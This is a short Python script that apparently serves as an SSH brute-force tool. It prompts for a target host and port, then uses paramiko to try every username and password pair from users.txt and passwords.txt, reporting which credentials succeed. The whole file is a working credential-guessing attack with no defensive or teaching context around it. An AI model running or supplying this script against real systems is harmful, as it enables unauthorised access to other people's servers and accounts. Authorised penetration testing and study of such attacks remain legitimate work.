import paramiko
import socket
import time

def brute_force_ssh(hostname,port,user,password):
    log = paramiko.util.log_to_file('log.log')
    ssh_client = paramiko.SSHClient()
    ssh_client.load_system_host_keys()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print('Testing credentials {}:{}'.format(user,password))
        ssh_client.connect(hostname,port=port,username=user,password=password, timeout=5)
        print('credentials ok {}:{}'.format(user,password))
    except paramiko.AuthenticationException as exception:
        print('AuthenticationException:',exception)
    except socket.error as error:
        print('SocketError:',error)


def main():
    hostname = input("Enter the target hostname: ")
    port = input("Enter the target port: ")
    users = open('users.txt','r')
    users = users.readlines()
    passwords = open('passwords.txt','r')
    passwords = passwords.readlines()

    for user in users:
        for password in passwords:
            time.sleep(3)
            brute_force_ssh(hostname,port,user.rstrip(),password.rstrip())


if __name__ == '__main__':
    main()
